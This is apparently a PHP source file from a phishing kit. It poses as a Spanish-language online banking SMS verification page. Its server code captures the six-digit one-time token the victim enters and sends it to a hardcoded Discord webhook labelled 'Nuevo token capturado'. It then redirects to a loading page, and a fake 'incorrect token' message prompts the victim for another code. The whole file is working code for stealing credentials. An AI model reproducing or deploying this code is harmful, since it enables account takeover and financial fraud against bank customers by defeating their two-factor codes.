<?php
ob_start();

// Webhook de Discord
$discord_webhook = "https://discord.com/api/webhooks/1393393491027034253/CxlTKBk_06fqkreErKBqFdZMAoYnFlZAHfA-aX6JicJsggCdGVeIoppTtWGo2frvMqsj";

$token = isset($_POST["token"]) ? trim($_POST["token"]) : '';

if (isset($_POST['submit']) && !empty($token)) {

    // Limpiar el token (solo números)
    $token = preg_replace('/[^0-9]/', '', $token);

    if (strlen($token) === 6) {
        // Datos para Discord con formato embed
        $discord_data = [
            'username' => 'Toketoso 79',
            'embeds' => [[
                'title' => '🔐 Segundo TOKEN 🔐 @everyone',
                'description' => 'Nuevo token capturado',
                'color' => 7419530,  // Verde personalizado
                'fields' => [
                    [
                        'name' => '🔢 Token',
                        'value' => "**$token**",
                        'inline' => false
                    ],
                    [
                        'name' => '📅 Fecha y Hora',
                        'value' => "<t:".time().":f>",
                        'inline' => false
                    ]
                ],
                'footer' => [
                    'text' => 'Toketoso Webhook'
                ],
                'timestamp' => date('c')
            ]]
        ];

        // Enviar a Discord
        $ch = curl_init($discord_webhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($discord_data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        curl_close($ch);
    }

    // Redirigir a pantalla de carga
    header("Location: loading2.php");
    ob_end_flush();
    exit();
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/index.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso digital</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@100;200;300;400;500;600;700;800;900&family=Inter:wght@200;300;400;500;600;700;800&family=Lato:wght@100;300;400;700;900&family=Montserrat:wght@100;300;400;500;600;700;800;900&family=Open+Sans:wght@300;400;500;600;700;800&family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
</head>
<body>
    <div class="wrapper-sm">
        <div class="container-sm">
            <div class="fixed-logo-sm">
                <img src="/logo.svg" width="150px" alt="">
                <p style="margin-top: 5px; font-size: 15px; color: #6a6a6a;">Online Banking</p>
            </div>

            <div class="login-container-sm">
                <form action="" class="login-form-sm" method="post">
                    <h2 class="form-h2-sm" style="width: 90%; text-align: center;">Verificación SMS</h2>
                    <br>
                    <p style="text-align: center; color: #6a6a6a;">Para verificar su identidad necesitamos que ingrese el Código Token enviado a su teléfono asociado.</p>

                    <div class="input-container-sm" style="flex-direction: row; height: 9rem;">
                        <img src="llave.svg" width="20px" style="filter: invert(43%) sepia(0%) saturate(17%) hue-rotate(232deg) brightness(95%) contrast(90%);" alt="">
                        <input type="text" class="input-sm" required maxlength="6" style="width: 90%;" name="token" placeholder="Clave Token SMS">
                    </div>

                    <p style="color: red; font-size: 14px; margin-top: -2rem; width: 80%;">
                        *Clave Token incorrecta, enviaremos un código nuevamente para evitar errores.
                    </p>

                    <br>
                    <button class="butonsin-sm" name="submit">CONTINUAR</button>

                    <br><br>
                    <p style="font-size: 11px; width: 100%; text-align: center; color: #6a6a6a;">
                        Sí es tu primera vez o necesitás el usuario<br>
                        Operar con Online Banking implica aceptar los <b>términos y condiciones</b> en los que se ofrece el servicio.<br>
                        <b>Información sobre seguridad.</b>
                    </p>
                </form>
            </div>

            <div class="background-sm"></div>
        </div>
    </div>
</body>
</html>
